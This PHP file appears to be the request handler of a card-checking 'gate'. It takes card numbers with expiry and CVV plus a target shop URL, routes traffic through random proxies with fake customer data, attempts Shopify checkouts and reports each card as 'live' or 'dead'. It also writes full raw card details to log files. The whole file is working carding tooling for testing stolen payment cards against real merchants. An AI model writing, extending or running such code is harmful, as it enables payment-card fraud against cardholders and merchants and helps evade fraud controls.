<?php
define('SHOPIFY_DEBUG', filter_var(getenv('SHOPIFY_DEBUG'), FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) ?? true);

error_reporting(E_ALL);
ini_set('ignore_repeated_errors', TRUE);
ini_set('display_errors', FALSE);
ini_set('log_errors', SHOPIFY_DEBUG);
ini_set('error_log', __DIR__ . '/php_errors.log');

function gateLog(string $step, string $card = ''): void
{
    if (!SHOPIFY_DEBUG) return;
    $ts = date('H:i:s.') . substr(sprintf('%.3f', fmod(microtime(true) * 1000, 1000)), 0, 3);
    $mask = $card ? substr($card, 0, 4) . '****' . substr($card, -3) : '-';
    $pid = getmypid();
    $line = "[$ts] [PID:$pid] [$mask] $step\n";
    file_put_contents(__DIR__ . '/gate_log.txt', $line, FILE_APPEND | LOCK_EX);
}

gateLog("REQUEST RECEIVED - PID " . getmypid());

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed', 'status' => 'error']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || empty($input['card'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Card data required', 'status' => 'error']);
    exit;
}

if (empty($input['website'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Website URL required', 'status' => 'error']);
    exit;
}

$cardRaw = trim($input['card']);
$cardParts = explode('|', $cardRaw);
if (count($cardParts) < 4) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid card format, expected cc|mes|ano|cvv', 'status' => 'error']);
    exit;
}

$cc   = trim($cardParts[0]);
$mes  = trim($cardParts[1]);
$ano  = trim($cardParts[2]);
$cvv  = trim($cardParts[3]);

$site = trim($input['website']);
if (!preg_match('#^https?://#', $site)) {
    $site = 'https://' . $site;
}

gateLog("INPUT OK - site: $site - card: $cardRaw");

$externalAddress = null;
if (!empty($input['address']) && is_array($input['address'])) {
    $externalAddress = $input['address'];
}

$externalEmail = null;
if (!empty($input['email']) && is_string($input['email'])) {
    $externalEmail = trim($input['email']);
}

$externalProduct = null;
if (!empty($input['product']) && is_array($input['product'])) {
    $externalProduct = $input['product'];
}

require_once __DIR__ . '/vendor/autoload.php';

$start = microtime(true);
$resultMessage = '';

try {
    $fakeData = new FakeGenerator();

    $proxyManager = new ProxyManager();
    $proxyManager->loadFromFile(__DIR__ . '/proxies.txt');
    $proxy = $proxyManager->random();

    gateLog("PROXY: " . $proxy['server'] . " | auth: " . substr($proxy['auth'] ?? '', 0, 20) . "...", $cardRaw);

    $shopify = new ShopifyAPi(
        site: $site,
        server: $proxy,
        fake_data: $fakeData,
        proxyManager: $proxyManager
    );

    $shopify->setCardDetails($cc, $mes, $ano, $cvv);

    if ($externalAddress !== null) {
        $shopify->setExternalAddress($externalAddress);
    }

    if ($externalEmail !== null) {
        $shopify->setExternalEmail($externalEmail);
    }

    if ($externalProduct !== null) {
        $shopify->setExternalProduct($externalProduct);
    }

    gateLog("CHECKOUT START", $cardRaw);
    $checkoutStart = microtime(true);

    ob_start();
    $resultMessage = $shopify->checkout();
    ob_end_clean();

    $checkoutElapsed = round((microtime(true) - $checkoutStart) * 1000, 0);
    gateLog("CHECKOUT DONE in {$checkoutElapsed}ms - result: $resultMessage", $cardRaw);
} catch (Throwable $e) {
    $elapsed = round((microtime(true) - $start) * 1000, 0);
    gateLog("FATAL EXCEPTION: " . $e->getMessage() . " in " . $e->getFile() . ":" . $e->getLine(), $cardRaw);
    echo json_encode([
        'status'   => 'error',
        'response' => 'Exception: ' . $e->getMessage(),
        'card'     => $cardRaw,
        'time_taken' => $elapsed,
    ]);
    exit;
}

$elapsed = round((microtime(true) - $start) * 1000, 0);

if (str_starts_with($resultMessage, 'Live:')) {
    $status = 'live';
} elseif (str_starts_with($resultMessage, 'Dead:')) {
    $status = 'dead';
} else {
    $status = 'error';
}

gateLog("RESPONSE: status=$status time={$elapsed}ms", $cardRaw);

echo json_encode([
    'status'    => $status,
    'response'  => $resultMessage,
    'card'      => $cardRaw,
    'time_taken' => $elapsed,
]);
